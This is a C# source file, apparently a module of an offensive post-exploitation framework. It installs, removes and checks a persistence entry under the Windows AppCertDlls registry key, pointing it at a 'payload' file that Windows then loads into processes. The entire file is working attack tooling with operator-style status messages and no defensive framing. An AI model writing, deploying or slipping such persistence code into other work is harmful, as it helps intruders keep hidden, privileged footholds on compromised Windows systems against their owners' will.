using System;
using System.IO;
using Microsoft.Win32;

namespace Framework.Modules
{
    public static class Worker
    {
        private const string RegPath = @"SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls";

        private static string GetDefaultPayloadPath()
        {
            try
            {
                return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
            }
            catch
            {
                return @"C:\Windows\System32\cmd.exe";
            }
        }

        public static string Info(string[] args)
        {
            string defaultName = "R2-117";
            string defaultPayload = GetDefaultPayloadPath();

            return $"[i] Default Start Command Parameters:\n" +
                   $"    R2 appcert_dlls Start {defaultName} {defaultPayload}";
        }

        public static string Start(string[] args)
        {
            string entryName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0])) 
                ? args[0] 
                : "R2-117";
            string payloadPath = (args != null && args.Length > 1 && !string.IsNullOrWhiteSpace(args[1])) 
                ? args[1] 
                : GetDefaultPayloadPath();

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true)
                                  ?? Registry.LocalMachine.CreateSubKey(RegPath, writable: true);

                if (baseKey == null)
                    return "[-] Access denied opening/creating AppCertDlls registry key. Run as administrator.";

                if (baseKey.GetValue(entryName) != null)
                    return $"[*] AppCert entry '{entryName}' already exists.";

                baseKey.SetValue(entryName, payloadPath, RegistryValueKind.String);

                return $"[+] Successfully Installed AppCert DLL entry '{entryName}' -> Payload: '{payloadPath}'";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. AppCertDlls modifications require administrative privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during installation: {ex.Message}";
            }
        }

        public static string Stop(string[] args)
        {
            string entryName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0])) 
                ? args[0] 
                : "R2-117";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: true);
                if (baseKey == null)
                    return "[-] AppCertDlls key does not exist or access is denied.";

                if (baseKey.GetValue(entryName) == null)
                    return $"[*] AppCert value '{entryName}' not found.";

                baseKey.DeleteValue(entryName, throwOnMissingValue: false);

                return $"[+] Successfully removed AppCert DLL entry '{entryName}'.";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied. Structural removal requires administrative privileges.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during removal: {ex.Message}";
            }
        }

        public static string Check(string[] args)
        {
            string entryName = (args != null && args.Length > 0 && !string.IsNullOrWhiteSpace(args[0])) 
                ? args[0] 
                : "R2-117";

            try
            {
                using var baseKey = Registry.LocalMachine.OpenSubKey(RegPath, writable: false);
                if (baseKey == null)
                    return $"[*] AppCertDlls key does not exist under Session Manager.";

                string dllPath = baseKey.GetValue(entryName) as string;

                if (string.IsNullOrEmpty(dllPath))
                    return $"[*] AppCert entry '{entryName}' not found in registry.";

                bool fileExists = File.Exists(dllPath);
                return $"[+] Verified AppCert entry '{entryName}' -> '{dllPath}' (Payload file present: {fileExists})";
            }
            catch (UnauthorizedAccessException)
            {
                return "[-] Access denied checking registry parameters.";
            }
            catch (Exception ex)
            {
                return $"[-] Error during verification: {ex.Message}";
            }
        }
    }
}